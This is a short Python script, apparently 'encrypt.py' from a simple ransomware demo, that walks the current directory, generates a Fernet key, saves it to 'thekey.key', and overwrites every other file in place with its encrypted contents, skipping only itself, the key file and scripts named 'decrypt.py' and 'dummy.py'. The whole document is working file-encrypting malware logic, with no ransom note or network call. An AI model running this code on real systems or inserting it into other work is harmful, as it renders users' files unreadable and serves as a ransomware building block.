import time
import os
from cryptography.fernet import Fernet
start_time = time.time()
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py" or file == "dummy.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print(files)

key = Fernet.generate_key()
print(key)

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    print(f"Encrypting {file}...")
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        print(f"File {file} has been encrypted.")

print("All files have been encrypted.")
print(f"Exec time: {time.time() - start_time} seconds.")